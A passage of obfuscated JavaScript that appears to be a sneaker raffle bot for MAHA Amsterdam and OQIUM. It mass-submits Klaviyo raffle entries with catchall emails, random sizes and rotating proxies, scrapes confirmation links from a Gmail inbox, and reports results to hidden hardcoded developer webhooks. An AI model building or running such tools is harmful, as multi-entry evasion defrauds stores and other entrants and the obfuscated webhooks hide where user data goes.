                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Retrying')), _0x76aca1 = _0x76aca1 - 0x1, _0x4159da = _0x4159da + 0x1;
                                continue;
                            }
                            _0x26ae0f == 'yes' && _0x4159da >= 0x5 && (_0x78fa55(_0x535120[_0x76aca1], _0x3a0615), _0x26ae0f = 'no', _0x4159da = 0x0), console['log']('Waiting\x20for\x20' + _0x474e1d['AfewDelay'] + '\x20ms'), await _0x90116b(_0x474e1d['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x114b61, _0x769e4c, _0x1de996) {
                    for (var _0x37930f = 0x0; _0x37930f < _0x769e4c['length']; _0x37930f++) {
                        async function _0x2b26c4(_0x25dc5c, _0x204914, _0x69bd46, _0x28db0a, _0x35ff01) {
                            var _0x43f856, _0xbb11ac = {}, _0x375b85 = [], _0x5bd3dc = {}, _0x4bb038 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x4350e4 = Math['round'](Math['random']() * (_0x4bb038['length'] - 0x1));
                            _0x28db0a[_0x25dc5c]['Size'] == 'RANDOM' && (_0x28db0a[_0x25dc5c]['Size'] = _0x4bb038[_0x4350e4]);
                            !_0x28db0a && (_0x28db0a = {});
                            if (_0x204914 != 'ver') {
                                _0x4e8779(_0x69bd46['name'] + '\x20Task\x20' + (_0x25dc5c + 0x1) + '\x20/\x20' + _0x28db0a['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x28db0a, _0x25dc5c), _0xbb11ac = _0x69bd46['data'];
                                _0x204914 == 'exp' ? _0xbb11ac['data']['attributes']['email'] = '' + _0x28db0a[_0x25dc5c]['FirstName'] + _0x28db0a[_0x25dc5c]['LastName'] + _0x474e1d['catchall'] : _0xbb11ac['data']['attributes']['email'] = '' + _0x28db0a[_0x25dc5c]['Email'];
                                if (_0x28db0a[_0x25dc5c]['Size'] == 'RANDOM') {
                                }
                                _0xbb11ac['data']['attributes']['properties']['$first_name'] = '' + _0x28db0a[_0x25dc5c]['FirstName'], _0xbb11ac['data']['attributes']['properties']['$last_name'] = '' + _0x28db0a[_0x25dc5c]['LastName'], _0xbb11ac['data']['attributes']['properties']['$address1'] = _0x28db0a[_0x25dc5c]['Address1'] + '\x20' + _0x28db0a[_0x25dc5c]['Address2'] + '\x20' + _0x28db0a[_0x25dc5c]['HouseNumber'], _0xbb11ac['data']['attributes']['properties']['$zip'] = '' + _0x28db0a[_0x25dc5c]['Zip'], _0xbb11ac['data']['attributes']['properties']['$city'] = '' + _0x28db0a[_0x25dc5c]['City'], _0xbb11ac['data']['attributes']['properties']['$country'] = '' + _0x28db0a[_0x25dc5c]['Country'], _0xbb11ac['data']['attributes']['properties']['Size'] = '' + _0x28db0a[_0x25dc5c]['Size'], _0xbb11ac['data']['attributes']['properties']['$phone_number'] = '' + _0x28db0a[_0x25dc5c]['Phone'], _0xbb11ac['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x28db0a[_0x25dc5c]['Follower'];
                            }
                            if (_0x474e1d['useRandomProxy'] = ![])
                                var _0x1cda83 = _0x35ff01[_0x25dc5c]['split'](':');
                            else
                                var _0x233f95 = Math['round'](Math['random']() * (_0x35ff01['length'] - 0x1)), _0x1cda83 = _0x35ff01[_0x233f95]['split'](':');
                            var _0x56404f = {
                                'jar': _0x6f82fb,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x69bd46['url'],
                                'headers': _0x69bd46['headers'],
                                'body': JSON['stringify'](_0xbb11ac),
                                'proxy': 'http://' + _0x1cda83[0x2] + ':' + _0x1cda83[0x3] + '@' + _0x1cda83[0x0] + ':' + _0x1cda83[0x1]
                            };
                            return _0x204914 != 'ver' && (_0x56404f['url'] = _0x69bd46['url'], _0x56404f['headers'] = _0x69bd46['headers']), _0x204914 == 'ver' && (_0x56404f['method'] = 'GET'), new Promise(function (_0x1e17cb, _0x101a84) {
                                callback = async (_0x200613, _0x32dfe1, _0x27ebe6) => {
                                    if (!_0x200613 && _0x32dfe1['statusCode'] == 0xca || !_0x200613 && _0x32dfe1['statusCode'] == 0xc8) {
                                        if (_0x204914 != 'ver') {
                                            var _0x53362b = await _0x476a56(_0x28db0a[_0x25dc5c], _0x69bd46, 'dev', ![]), _0x26ebb1 = await _0x476a56(_0x28db0a[_0x25dc5c], _0x69bd46, 'pub', ![]);
                                            const _0x1621b9 = {
                                                'succesDEVMSG': { 'embeds': [_0x53362b] },
                                                'succesPUBMSG': { 'embeds': [_0x26ebb1] }
                                            };
                                            if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                                                try {
                                                    await _0x2860ef(_0x474e1d['webhook'], _0x1621b9['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x1621b9['succesDEVMSG']), await _0x90116b(0xc8);
                                            try {
                                                await _0x2860ef(_0x3c50b7, _0x1621b9['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x2812a5(_0x28db0a[_0x25dc5c], _0x69bd46);
                                        }
                                        _0x1e17cb(console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x69bd46['name'] + ']\x20Task\x20' + (_0x25dc5c + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x204914 != 'ver') {
                                            var _0x1c5879 = '' + _0x200613, _0x320f00 = await _0x476a56(_0x28db0a[_0x25dc5c], _0x69bd46, 'dev', !![], _0x1c5879), _0x234fbf = {};
                                            _0x234fbf['errorDEV'] = { 'embeds': [_0x320f00] }, _0x78fa55(_0x28db0a[_0x25dc5c], _0x69bd46), _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x234fbf['errorDEV']), await _0x2860ef(_0x406b45, _0x234fbf['errorDEV']);
                                        }
                                        _0x101a84(console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x69bd46['name'] + ']\x20Task\x20' + (_0x25dc5c + 0x1) + ':\x20' + _0x200613)));
                                    }
                                };
                                try {
                                    _0x204914 != 'ver' && console['log'](_0xd645bd() + '\x20[' + _0x69bd46['name'] + ']\x20Task\x20' + (_0x25dc5c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xbb11ac['data']['attributes']['email']), _0x38301a(_0x56404f, callback);
                                } catch (_0x1e0d13) {
                                    console['log'](_0xd645bd() + '\x20Task\x20' + (_0x25dc5c + 0x1) + ':\x20' + _0x1e0d13);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x2b26c4(_0x37930f, 'nor', _0x114b61, _0x769e4c, _0x1de996), console['log'](_0xd645bd() + '\x20[' + _0x114b61['name'] + ']\x20Sleeping\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        } catch (_0x5921be) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xd67614, _0x3b7bd7, _0xdfba88) {
                    var _0xfe063f = [];
                    async function _0x479a06() {
                        var _0x54ff1f = new _0x59e93a({
                            'user': _0x474e1d['masterMail'],
                            'password': _0x474e1d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x39efad(_0x5ec036) {
                            _0x54ff1f['openBox']('INBOX', ![], _0x5ec036);
                        }
                        _0x54ff1f['once']('ready', function () {
                            _0x39efad(function (_0x2d92b1, _0x587257) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2d92b1)
                                    throw _0x2d92b1;
                                _0x54ff1f['seq']['search'](['UNSEEN'], function (_0x354cab, _0x4042b9) {
                                    if (!_0x4042b9 || !_0x4042b9['length'])
                                        console['log'](_0xd645bd() + '\x20[' + _0xd67614['name'] + ']\x20No\x20mails\x20found'), _0x54ff1f['end']();
                                    else {
                                        var _0x69af1b = _0x54ff1f['seq']['fetch'](_0x4042b9, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x69af1b['on']('message', function (_0xd8ab99, _0x505259) {
                                            var _0x3d821a = '(#' + _0x505259 + ')\x20';
                                            _0xd8ab99['on']('body', function (_0xa0de77, _0x345d91) {
                                                _0x2cd09b(_0xa0de77, (_0x3ab870, _0x419b8d) => {
                                                    if (_0x419b8d['subject'] == 'Confirm\x20Your\x20Subscription' && _0x419b8d['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x5c7c2a = _0x419b8d['text']['split']('(')[0x1], _0x241318 = _0x5c7c2a['split'](')')[0x0];
                                                        _0xfe063f['push'](_0x241318);
                                                    }
                                                });
                                            }), _0xd8ab99['once']('end', function () {
                                            });
                                        }), _0x69af1b['once']('error', function (_0x584830) {
                                            console['log']('Fetch\x20error:\x20' + _0x584830);
                                        }), _0x69af1b['once']('end', function () {
                                            _0x54ff1f['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x54ff1f['once']('error', function (_0xbd5567) {
                            console['log'](_0x5bbbd3['red'](_0xbd5567['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x54ff1f['once']('end', async function () {
                        }), _0x54ff1f['connect']();
                    }
                    async function _0x129252(_0x4062ef, _0x252457, _0x42cc59) {
                        for (var _0x20c27d = 0x0; _0x20c27d < _0x252457['length']; _0x20c27d++) {
                            async function _0x14f1b1(_0x35f07b, _0x3df2f6, _0x20b6c0, _0x25a727, _0x3fc07f) {
                                var _0x23bd73, _0x3aadf3 = {}, _0x52f2a5 = [], _0x28df53 = {}, _0xb1bc06 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x619e23 = Math['round'](Math['random']() * (_0xb1bc06['length'] - 0x1));
                                _0x25a727[_0x35f07b]['Size'] == 'RANDOM' && (_0x25a727[_0x35f07b]['Size'] = _0xb1bc06[_0x619e23]);
                                !_0x25a727 && (_0x25a727 = {});
                                if (_0x474e1d['useRandomProxy'] = ![])
                                    var _0x59db16 = _0x3fc07f[_0x35f07b]['split'](':');
                                else
                                    var _0xb8e330 = Math['round'](Math['random']() * (_0x3fc07f['length'] - 0x1)), _0x59db16 = _0x3fc07f[_0xb8e330]['split'](':');
                                var _0x373fb7 = {
                                    'jar': _0x6f82fb,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x20b6c0['url'],
                                    'headers': _0x20b6c0['headers'],
                                    'body': JSON['stringify'](_0x3aadf3),
                                    'proxy': 'http://' + _0x59db16[0x2] + ':' + _0x59db16[0x3] + '@' + _0x59db16[0x0] + ':' + _0x59db16[0x1]
                                };
                                return _0x3df2f6 != 'ver' && (_0x373fb7['url'] = _0x20b6c0['url'], _0x373fb7['headers'] = _0x20b6c0['headers']), _0x3df2f6 == 'ver' && (_0x373fb7['method'] = 'GET', _0x373fb7['url'] = _0x25a727[_0x35f07b]), new Promise(function (_0xba238d, _0x560af4) {
                                    callback = async (_0x3747f0, _0x174073, _0x1d6031) => {
                                        if (!_0x3747f0 && _0x174073['statusCode'] == 0xca || !_0x3747f0 && _0x174073['statusCode'] == 0xc8) {
                                            if (_0x3df2f6 != 'ver') {
                                                var _0x3306fe = await _0x476a56(_0x25a727[_0x35f07b], _0x20b6c0, 'dev', ![]), _0x261354 = await _0x476a56(_0x25a727[_0x35f07b], _0x20b6c0, 'pub', ![]);
                                                const _0xcccd0 = {
                                                    'succesDEVMSG': { 'embeds': [_0x3306fe] },
                                                    'succesPUBMSG': { 'embeds': [_0x261354] }
                                                };
                                                if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                                                    try {
                                                        await _0x2860ef(_0x474e1d['webhook'], _0xcccd0['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0xcccd0['succesDEVMSG']), await _0x90116b(0xc8);
                                                try {
                                                    await _0x2860ef(_0x3c50b7, _0xcccd0['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x2812a5(_0x25a727[_0x35f07b], _0x20b6c0);
                                            }
                                            _0xba238d(console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x20b6c0['name'] + ']\x20Task\x20' + (_0x35f07b + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3df2f6 != 'ver') {
                                                var _0x410d6e = '' + _0x3747f0, _0x483bc5 = await _0x476a56(_0x25a727[_0x35f07b], _0x20b6c0, 'dev', !![], _0x410d6e), _0x368c97 = {};
                                                _0x368c97['errorDEV'] = { 'embeds': [_0x483bc5] }, _0x78fa55(_0x25a727[_0x35f07b], _0x20b6c0), _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x368c97['errorDEV']), await _0x2860ef(_0x406b45, _0x368c97['errorDEV']);
                                            }
                                            _0x560af4(console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x20b6c0['name'] + ']\x20Task\x20' + (_0x35f07b + 0x1) + ':\x20' + _0x3747f0)));
                                        }
                                    };
                                    try {
                                        _0x3df2f6 != 'ver' ? console['log'](_0xd645bd() + '\x20[' + _0x20b6c0['name'] + ']\x20Task\x20' + (_0x35f07b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3aadf3['data']['attributes']['email']) : console['log'](_0xd645bd() + '\x20[' + _0x20b6c0['name'] + ']\x20Task\x20' + (_0x35f07b + 0x1) + ':\x20Fetching\x20Response'), _0x38301a(_0x373fb7, callback);
                                    } catch (_0x245fa0) {
                                        console['log'](_0xd645bd() + '\x20Task\x20' + (_0x35f07b + 0x1) + ':\x20' + _0x245fa0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x14f1b1(_0x20c27d, 'ver', _0x4062ef, _0x252457, _0x42cc59), console['log'](_0xd645bd() + '\x20[' + _0x4062ef['name'] + ']\x20Sleeping\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                            } catch (_0x3a5251) {
                            }
                        }
                    }
                    try {
                        _0x479a06(), await _0x90116b(0xfa0), console['log']('Found\x20' + _0xfe063f['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x90116b(0x9c4);
                    }
                    await _0x129252(_0xd67614, _0xfe063f, _0xdfba88);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1ab1d7, _0xb5d8ce, _0x33c125) {
                    for (var _0x576867 = 0x0; _0x576867 < _0xb5d8ce['length']; _0x576867++) {
                        async function _0x3ad535(_0x23d002, _0x2a4883, _0x245f2c, _0x4a9493, _0x3e2cbd) {
                            var _0xacc530, _0x53d5ff = {}, _0x4fc946 = [], _0x34b68d = {}, _0x936d27 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x4648dd = Math['round'](Math['random']() * (_0x936d27['length'] - 0x1));
                            _0x4a9493[_0x23d002]['Size'] == 'RANDOM' && (_0x4a9493[_0x23d002]['Size'] = _0x936d27[_0x4648dd]);
                            !_0x4a9493 && (_0x4a9493 = {});
                            if (_0x2a4883 != 'ver') {
                                _0x4e8779(_0x245f2c['name'] + '\x20Task\x20' + (_0x23d002 + 0x1) + '\x20/\x20' + _0x4a9493['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x4a9493, _0x23d002), _0x4fc946 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x54e6a5
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x4a9493[_0x23d002]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x474e1d['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x1144ef
                                        }
                                    ]
                                }], _0x34b68d = { 'embeds': _0x4fc946 }, _0x53d5ff = _0x245f2c['data'];
                                _0x2a4883 == 'exp' ? _0x53d5ff['data']['attributes']['email'] = '' + _0x4a9493[_0x23d002]['FirstName'] + _0x4a9493[_0x23d002]['LastName'] + _0x474e1d['catchall'] : _0x53d5ff['data']['attributes']['email'] = '' + _0x4a9493[_0x23d002]['Email'];
                                if (_0x4a9493[_0x23d002]['Size'] == 'RANDOM') {
                                }
                                _0x53d5ff['data']['attributes']['properties']['$first_name'] = '' + _0x4a9493[_0x23d002]['FirstName'], _0x53d5ff['data']['attributes']['properties']['$last_name'] = '' + _0x4a9493[_0x23d002]['LastName'], _0x53d5ff['data']['attributes']['properties']['$address1'] = _0x4a9493[_0x23d002]['Address1'] + '\x20' + _0x4a9493[_0x23d002]['Address2'] + '\x20' + _0x4a9493[_0x23d002]['HouseNumber'], _0x53d5ff['data']['attributes']['properties']['$zip'] = '' + _0x4a9493[_0x23d002]['Zip'], _0x53d5ff['data']['attributes']['properties']['$city'] = '' + _0x4a9493[_0x23d002]['City'], _0x53d5ff['data']['attributes']['properties']['$country'] = '' + _0x4a9493[_0x23d002]['Country'], _0x53d5ff['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4a9493[_0x23d002]['Size'], _0x53d5ff['data']['attributes']['properties']['$phone_number'] = '' + _0x4a9493[_0x23d002]['Phone'], _0x53d5ff['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4a9493[_0x23d002]['Follower'];
                            }
                            if (_0x474e1d['useRandomProxy'] = ![])
                                var _0x3a6333 = _0x3e2cbd[_0x23d002]['split'](':');
                            else
                                var _0x3ec83c = Math['round'](Math['random']() * (_0x3e2cbd['length'] - 0x1)), _0x3a6333 = _0x3e2cbd[_0x3ec83c]['split'](':');
                            var _0xaf4453 = {
                                'jar': _0x6f82fb,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x245f2c['url'],
                                'headers': _0x245f2c['headers'],
                                'body': JSON['stringify'](_0x53d5ff),
                                'proxy': 'http://' + _0x3a6333[0x2] + ':' + _0x3a6333[0x3] + '@' + _0x3a6333[0x0] + ':' + _0x3a6333[0x1]
                            };
                            return _0x2a4883 != 'ver' && (_0xaf4453['url'] = _0x245f2c['url'], _0xaf4453['headers'] = _0x245f2c['headers']), _0x2a4883 == 'ver' && (_0xaf4453['method'] = 'GET'), new Promise(function (_0x360df6, _0x2c956d) {
                                callback = async (_0x350f21, _0x220f1b, _0xc5d5a8) => {
                                    if (!_0x350f21 && _0x220f1b['statusCode'] == 0xca || !_0x350f21 && _0x220f1b['statusCode'] == 0xc8) {
                                        if (_0x2a4883 != 'ver') {
                                            var _0x40ffe5 = await _0x476a56(_0x4a9493[_0x23d002], _0x245f2c, 'dev', ![]), _0x20fcca = await _0x476a56(_0x4a9493[_0x23d002], _0x245f2c, 'pub', ![]);
                                            const _0x39194a = {
                                                'succesDEVMSG': { 'embeds': [_0x40ffe5] },
                                                'succesPUBMSG': { 'embeds': [_0x20fcca] }
                                            };
                                            if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                                                try {
                                                    await _0x2860ef(_0x474e1d['webhook'], _0x39194a['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x39194a['succesDEVMSG']), await _0x90116b(0xc8);
                                            try {
                                                await _0x2860ef(_0x3c50b7, _0x39194a['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x2812a5(_0x4a9493[_0x23d002], _0x245f2c);
                                        }
                                        _0x360df6(console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x245f2c['name'] + ']\x20Task\x20' + (_0x23d002 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x2a4883 != 'ver') {
                                            var _0x4d3bba = '' + _0x350f21, _0x544528 = await _0x476a56(_0x4a9493[_0x23d002], _0x245f2c, 'dev', !![], _0x4d3bba), _0x40aec8 = {};
                                            _0x40aec8['errorDEV'] = { 'embeds': [_0x544528] }, _0x78fa55(_0x4a9493[_0x23d002], _0x245f2c), _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x40aec8['errorDEV']), await _0x2860ef(_0x406b45, _0x40aec8['errorDEV']);
                                        }
                                        _0x2c956d(console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x245f2c['name'] + ']\x20Task\x20' + (_0x23d002 + 0x1) + ':\x20' + _0x350f21)));
                                    }
                                };
                                try {
                                    _0x2a4883 != 'ver' && console['log'](_0xd645bd() + '\x20[' + _0x245f2c['name'] + ']\x20Task\x20' + (_0x23d002 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x53d5ff['data']['attributes']['email']), _0x38301a(_0xaf4453, callback);
                                } catch (_0x538fc3) {
                                    console['log'](_0xd645bd() + '\x20Task\x20' + (_0x23d002 + 0x1) + ':\x20' + _0x538fc3);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x3ad535(_0x576867, 'nor', _0x1ab1d7, _0xb5d8ce, _0x33c125), console['log'](_0xd645bd() + '\x20[' + _0x1ab1d7['name'] + ']\x20Sleeping\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        } catch (_0x5ae504) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x14b7c7, _0x3c1e9b, _0x5c5c24) {
                    var _0x3c1e9b = [];
                    async function _0x423351() {
                        var _0x20f725 = new _0x59e93a({
                            'user': _0x474e1d['masterMail'],
                            'password': _0x474e1d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x31a9e5(_0x5b5678) {
